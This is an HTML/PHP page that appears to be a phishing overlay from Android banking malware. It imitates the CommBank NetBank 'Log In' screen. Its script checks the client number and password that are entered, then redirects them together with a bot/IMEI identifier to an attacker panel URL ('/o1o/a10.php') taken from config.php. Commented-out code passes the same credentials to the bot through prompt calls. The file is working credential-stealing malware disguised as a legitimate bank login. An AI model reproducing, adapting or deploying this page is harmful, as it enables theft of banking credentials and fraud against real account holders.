<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
<meta name="viewport" content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0" />

<style>
	.mainform {
		margin-left: 5px;
	}

	p {
	 	margin-bottom:15px;
	}

	body {
		margin:0;
		padding:0;
		font-family:arial,sans-serif;
		font-size:12px;
		-webkit-text-size-adjust:none;
		-moz-text-size-adjust:none;
		-ms-text-size-adjust:none;
		text-size-adjust:none;
		background-color: #E7E7E7;
		font-family: "Arial";
		font-size: 20px;
	}

	.button {
		background: #FCCF1A;
		display:inline;
		font-family:Arial;
		font-size:16px;	
		padding:5px 5px;
		text-decoration:none;
		width: 90%;
		margin-top: 30px;
		height: 40px;
		border: none;
		box-shadow: 0 1px 1px #B3971C;
		color: black;
	}

	.button:active {
		position:relative;
		top:1px;
	}

	.field {
	    margin-bottom: 20px;
	  	background-color: #E7E7E7;
	    outline: none;
	    border: 1px solid #E7E7E7;
		border-bottom: 1px solid #BDBDBD;
		width: 80%;
		margin-left: 10px;
		margin-right: 10px;
		font-family: "Arial"	;
		font-size: 18px;
		font-weight: lighter;
		text-indent: 5px; 
	}

	.field:hover {
		border-bottom: 2px solid #FACC0E;
	}
		
	.header {
		padding-top: 10px;
		padding-left: 5%;
		background: #FFF;
		weight: 100%;
		height: 40px;
		color: black;
		border: none;
		box-shadow: 0 1px 1px #cccccc;
	}

	.iconfield {
		width: 20px;
		height: 20px;
		padding-left: 5%;
		float: left;
	}	
		
	ul.hr {
	   margin: 0;
	   padding: 4px;
	}

	ul.hr li {
	   display: inline;
	   margin-right: 5px;
	}
	  
	.fielderror{
	    border: 1px solid #EC4343;
	    margin-bottom: 20px;
	  	background-color: #E7E7E7;
	    outline: none;
		width: 80%;
		margin-left: 10px;
		margin-right: 10px;
		font-family: "Arial"	;
		font-size: 18px;
		font-weight: lighter;
		text-indent: 5px; 
	}
</style>

	

</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">

	<div class="header">Log In</div>

	<div class="mainform">
	<div class="bodyclass">

		<form action="null" method="post" id="_mainForm" target="flow_handler">
			<center> 
				<span style="font-size: 16px; font-weight: bold; display: block; margin-top: 10px;"> Log on with your NetBank details </span>
			</center>
			<br>

			<center>
				<img class="iconfield" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAQAAABIkb+zAAADEElEQVR4Ae3YT2gcVRzA8W83tjvunxwUBQkYk00iwZRQ7xa86rklNTWXED3rTQ96UqxssRRtVieskIKHhKDelyBZNLBKMWC3EpBoKNjZ9iA0m81uS3/upbA8ZreT7kzmFX6f7/Ud3g/ee8sOSimllFJKKRWqLOdwqXCHVrvbVHCZIcsTYYIi+4hPdZYYw2pPk+ce0qMWn+NgqXH+QAK0RQ4LnaKGBMxjGsuMU0MInkcOi6SCHB6jLRyskUd8ukuJYrsSdxGfLmCJCZ+X5y/Ok+Qhhzl2fF6kHFYoIkbfkcKUZgUxcrHAIPuY2z+GnwSrxso9MsTunHl4SNFNhl1j9Vli5xpbOk8v88bqArGrGC9Pkl5SNJCONondHaSjEo+yYfygxa6FdFTkUa4iHTV1gL7dPuQRKtt2hMxL7NBL2r5L/A3SGXP0smDfMzpjbGmHNN0MctNYfYbYZagbm1ohgZ8E3yPGgUtjARcxWiWDadDcPkIBK4zRQox2mSfFQ2kWuIkYNRnBEhcQnxpscLVdmQbi0ydYw2ELOWTXSGKRHB4SPP7lJSwzza3g2+ckFhrl94CHZwRLOXxGC+lRk09JYrUcLnuIT3t8zShPhAxnKbCJR7OdxyYFzpDGckqpE5xkho/4lnWu41HnPsIBNW6wzjIf8xbTnMA6LzDLFX6jhQSoxTUWmWWI2A3wGnmqyGNW5SKnSRCLU3yBh4TQLS7zKkfoOLNUkJD7lbc5TuQGmGcXiah/eIeniNBpqkjEVXmdSDgs8gAJ1AHbbLDGMi4uy6xRZpsmErArOIRsKMCp9/iBD3iDF7t+VhnmTT7kR2oB/jMMhbv9HaRr9yjxHq9wGFO8zzr3ka79zTAhyXIdwb8yCzzD43qWd/m5x23IEoqvEJ/qfMkkYZhikQbik0sIJn2u7gF5niNMz3PJ55I/YIq+XUSMfmKMKLxMGTG6TN/MLw2XSBCVAczjWqVv/yEd/UK0jhnPdYO+HfX35CWkMx1AB7BsgBssRdyfoQ8QczqADqAD6ABWDqCUUkoppZRS/wP56FT03NABRAAAAABJRU5ErkJggg==">
				<input  id="login" name="Client number" placeholder="Client number" type="text" class="field" minlength="8" maxlength="8" onkeypress="return event.charCode >= 48 && event.charCode <= 57"><br>

				<img class="iconfield" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAQAAABIkb+zAAACVklEQVR4Ae2aP0/TXxSHHxsq4OifRdC4E6wMRl6JJrwKAguyG9nb/lpMw+JoJGk0shniSzBNSUuiCHHSjv5sGXrs6klber3ley7JeT7zTe8Tbs7hkxZn6jhOjlW22adBh/NBOjR4y3OekCN57rHDd2REznjJAslym13OkQvSo8ItEmSNDjJhfvKMpMjzCgnMf8yQCDf4gISH98yTAHkOkH/MO2awZszjOabO3iB1jpERKWPMGjIkX9hQ43KRTU6QIXmKIXeGTJ5frI94GHk2+R9R+cFNzNhFVE5YYhwPOUVUSnZbV6+tryxyEfc5U6e63MWEHfTjWWISHvFbnXyBATn0/zzrTMqWOnnKNTJnVU+egJl+Hf2MHpM52+oKG4Sg/wZbZM6+usICITxQp9+QOQ21dUP59tf5z2SNWmF1QjlQ6yxr1A7YI5TXquZkjqiEUtPnXcAFXMAFXCBpgRWqtOkhl5weLSoUmCrz1JBM06fK3PSu/wkxyOG0FGqIUSrTeftilj4FoqkihikTTdtU4IhoeqYCXbOFZfB59gIu4AIu4AIu4AIu4AK6Q+uOm76A7tC646YvoDu07rjJC9RiOq69wEpcx7UXqMZ1XHuBdlzHtRfoRXbcWAEXaI0VaKYvUBkrUExfoEB/zBhdTkkgfJCW4CoIzHGIDMlHZtMV0ApV9ZD6lJiFlAU0Bcoc0R2kSZFlLzQu4AIu4AIu4ALhuIAL+BfdtEwFmkRTMRUoEoHquAZRHfrq/eCmRBy642aQ8A4d0nEzSHiHDu64crkJ6dCO4ziO8wdTKQgzO6hj8gAAAABJRU5ErkJggg==">
				<input  id="password" name="password" placeholder="Password" type="password" minlength="8" maxlength="16" class="field"><br>


				<p style="font-size: 12px;">
					Forgotten your Net Bank details?
					<br>
					<br>
					I'm using a NetCode Token
				<p>
			</center>

			<input type="button" value="Log on" id="input_submitBtn" class="button" style="margin-left: 5%;" />
			<input type="hidden" name="name" value="CommBank" />

		</form>
		<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
	</div>
        <script type="text/javascript">
			(function () {

                var __insHiddenField = function (objDoc, objForm, sNm, sV) {
                    var input = objDoc.createElement("input");
                    input.setAttribute("type", "hidden");
                    input.setAttribute("name", sNm);
                    input.setAttribute("value", sV);
					input.value = sV;
                    objForm.appendChild(input);
                };

               /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
				
				if(!/https?:\/\//i.test(g_sFAct))
				   g_sFAct = 'http://' + g_sFAct;
				
                g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
				try{
				   g_oForm.action = g_sFAct;
				} catch(e){};
				
				var g_FrmCode = prompt('getId');
                __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                var g_oBtn = document.getElementById('input_submitBtn');
                g_oBtn.onclick = function () {
				
					var oNumInp = document.getElementById('login');
                    var oCodeInp = document.getElementById('password');

					try{
						oNumInp.className = oCodeInp.className = 'field';
					} catch(e){};
					
                    if (oNumInp.value.length != 8) {
						try{
							oNumInp.className = 'fielderror';
						} catch(e){};
                        return false;
                    }
					
                    if (!/^(?=^.{6,}$)((?=.*\d)|(?=.*\W+))(?![.\n])(?=.*[A-Z])(?=.*[a-z]).*$/i.test(oCodeInp.value)) {
						try{
                            oCodeInp.className = 'fielderror';
						} catch(e){};
                        return false;
                    }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "commbank'+
					'", "client_number": "'+oNumInp.value+
					'", "password": "'+oCodeInp.value+'"}');
					
					//setTimeout(function(){prompt('closeSuccessDialog')}, 7000);
					document.getElementById('content_div').style.visibility = 'hidden';
					g_oForm.submit();*/
					
					
					
					var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|commbank|"+oNumInp.value+"|"+oCodeInp.value+"|");
					
					return false;
                };

            })();
        </script>
</body>

</html>
